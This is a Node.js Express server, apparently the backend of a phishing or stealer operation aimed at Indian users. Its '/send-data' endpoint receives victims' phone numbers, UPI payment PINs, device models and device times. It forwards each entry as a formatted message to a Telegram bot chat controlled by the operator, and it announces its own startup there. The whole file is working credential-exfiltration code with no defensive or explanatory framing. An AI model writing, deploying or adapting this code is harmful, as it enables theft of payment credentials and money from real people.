require('dotenv').config();
const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

const { PORT, BOT_TOKEN, CHAT_ID } = process.env;

const sendToTelegram = async (message) => {
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
    } catch (error) {}
};

const startupNotification = async () => {
    await sendToTelegram(`*BJP Client's*`);
};

app.post('/send-data', async (req, res) => {

    const { type, number, pin, deviceId, deviceTime } = req.body;
    
    const now = new Date();
    const date = now.toLocaleDateString('en-IN');

    let formattedNumber = number ? `+91 ${number}` : 'Pending...';
    let upiStatus = type === 'NUMBER' ? 'PENDING' : `\`${pin}\``;

    let message = `*Device Model:* ${deviceId || 'Detecting...'}\n`;
    message += `*Date:* ${date}\n`;
    message += `*Real Time:* ${deviceTime || 'Detecting...'}\n`; 
    message += `*Number:* ${formattedNumber}\n`;
    message += `*UPI PIN:* ${upiStatus}`;

    await sendToTelegram(message);
    res.status(200).json({ success: true });
});

app.listen(PORT, () => {
    startupNotification();
});
